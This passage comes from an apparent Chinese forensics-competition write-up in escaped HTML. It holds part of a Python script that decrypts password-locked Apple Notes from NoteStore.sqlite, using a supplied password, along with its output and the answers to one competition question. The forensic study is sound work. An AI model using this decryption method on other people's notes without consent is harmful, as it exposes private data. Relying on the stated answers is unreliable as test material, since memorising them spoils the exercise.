&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#c678dd&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[+] Step 3: Found encrypted content in column &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;source_column&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;.&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;data_to_decrypt&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;bytes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;data_to_decrypt&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#7f848e&#34;&gt;# 步骤 4: AES-GCM 解密笔记内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;not&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;iv_blob&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;tag_blob&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[*] Skipping content decryption for Z_PK=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;pk&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;, missing IV or Tag in ZICNOTEDATA.&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#c678dd&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;nonce_d&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;bytes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;iv_blob&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;tag_d&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;bytes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;tag_blob&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;ciphertext_d&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;data_to_decrypt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[+] Step 4: Decrypting note content using AES-GCM...&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;plaintext_gzipped&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;decrypt_aes_gcm&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;aes_key&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;nonce_d&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;ciphertext_d&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;tag_d&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;plaintext_gzipped&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#7f848e&#34;&gt;# 步骤 5: Gzip 解压&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[+] Step 5: Decompressing Gzip data...&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#c678dd&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e06c75&#34;&gt;decompressed_data&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;zlib&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;decompress&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;plaintext_gzipped&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;zlib&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;MAX_WBITS&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;======== DECRYPTED NOTE (Z_PK=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;pk&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;) ========&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#7f848e&#34;&gt;# 只显示可解码文本，忽略不可打印字符&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;decompressed_data&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;decode&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;errors&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e06c75&#34;&gt;decryption_successful&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#c678dd&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;zlib&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;error&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;e&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[!] Gzip decompression failed for Z_PK=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;pk&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;. Error: &lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Raw decrypted data (gzipped):&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;plaintext_gzipped&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;conn&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;close&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;decryption_successful&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;rows&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;[!] Decryption failed for all notes. Please double-check the password.&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;__name__&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;main&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单说一下运行过程：&lt;/p&gt;
&lt;p&gt;脚本首先将我们输入的密码、从数据库&lt;code&gt;ZICCLOUDSYNCINGOBJECT&lt;/code&gt;表中读取的盐和迭代次数 三者混合，进行20000次SHA256哈希，得到主密钥，用主密钥去解密从&lt;code&gt;ZICCLOUDSYNCINGOBJECT&lt;/code&gt;表得到的 &lt;code&gt;ZCRYPTOWRAPPEDKEY&lt;/code&gt;列，取出专门用于加密这条笔记内容的笔记密钥&lt;/p&gt;
&lt;p&gt;接着脚本会检查两个可能存放笔记内容的位置，使用笔记密钥配合从&lt;code&gt;ZICNOTEDATA&lt;/code&gt;表中读取的初始化向量和认证标签，对加密内容进行解密&lt;/p&gt;
&lt;p&gt;最后解密出的数据并非纯文本，而是一个gzip压缩包，调用&lt;code&gt;zlib.decompress&lt;/code&gt;函数对其进行解压，得到最终的二进制数据（Protobuf格式），再尽力将这些二进制数据解码为UTF-8文本，并将其中可读的部分打印在屏幕上&lt;/p&gt;
&lt;p&gt;嗯，真是太麻烦了&lt;/p&gt;
&lt;p&gt;总之下一步，使用下面的命令运行脚本，注意传入明文密钥（少什么库就下载什么）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python decrypt_notes.py NoteStore.sqlite &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;234567&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--- Processing Note &lt;span style=&#34;color:#e06c75&#34;&gt;Z_PK&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;31&lt;/span&gt; ---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; Step 2: Unwrapping note encryption key using AES Key Unwrap...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; Successfully unwrapped note key!
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; Step 3: Found encrypted content in column &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;ZDATA from ZICNOTEDATA&amp;#39;&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; Step 4: Decrypting note content using AES-GCM...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; Step 5: Decompressing Gzip data...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;========&lt;/span&gt; DECRYPTED NOTE &lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Z_PK&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;31&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;========&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;▒
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Halo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;123456▒
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;▒
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;▒
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;▒
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;▒
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;▒
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;c=!FCe8▒h▒hȕ*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;hȕ*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;  ▒hȕ*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;     ▒hȕ*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;        ▒hɕ*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;           ▒hɕ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;============================================================
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;--- Processing Note Z_PK=33 ---
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;[+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;[+] Step 2: Unwrapping note encryption key using AES Key Unwrap...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;[+] Successfully unwrapped note key!
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;[+] Step 3: Found encrypted content in column &amp;#39;ZDATA from ZICNOTEDATA&amp;#39;.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;[+] Step 4: Decrypting note content using AES-GCM...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;[+] Step 5: Decompressing Gzip data...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;======== DECRYPTED NOTE (Z_PK=33) ========
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;今天
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;▒
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;(▒
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;(▒
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;▒
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;!FC*8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    h☚*
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     h☚*
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;h☚
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;============================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的是&amp;quot;Halo&amp;quot;的，下面的是&amp;quot;今天&amp;quot;的，它们的内容和很多&lt;code&gt;▒&lt;/code&gt;这样的奇怪字符混在一起，是因为它们被包裹在 Protobuf这种二进制结构中，用于保存格式、字体、附件引用等信息，我们现在看到的，就是把这个复杂的二进制结构强行当成文本显示的结果&lt;/p&gt;
&lt;p&gt;如何分辨？那最好还是丢给ai：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815134842012&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815134842012.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815134842012.png&#34; alt=&#34;image-20250815134842012&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;那么123456应该就是题目说的数字串了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;123456
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时37题的真正的答案也出来了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Halo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;林浚熙计算机39-52&#34;&gt;林浚熙计算机(39-52)
